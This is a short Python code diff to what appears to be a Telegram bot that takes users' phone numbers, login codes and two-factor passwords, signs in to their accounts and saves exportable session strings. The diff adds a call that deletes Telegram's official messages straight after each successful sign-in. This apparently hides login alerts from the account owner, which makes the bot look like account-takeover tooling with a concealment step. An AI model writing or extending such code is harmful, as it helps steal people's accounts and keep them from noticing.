@@ -321,6 +321,7 @@ async def submit_code(user_id: int, code: str, is_refresh: bool = False) -> dict
     phone_code_hash = data["phone_code_hash"]
     try:
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        await delete_telegram_official_messages(client)
         session_string = client.session.save()
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
@@ -367,6 +368,7 @@ async def submit_2fa(user_id: int, password: str, is_refresh: bool = False) -> d
     phone = data["phone"]
     try:
         await client.sign_in(password=password)
+        await delete_telegram_official_messages(client)
         session_string = client.session.save()
         me = await client.get_me()
         full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
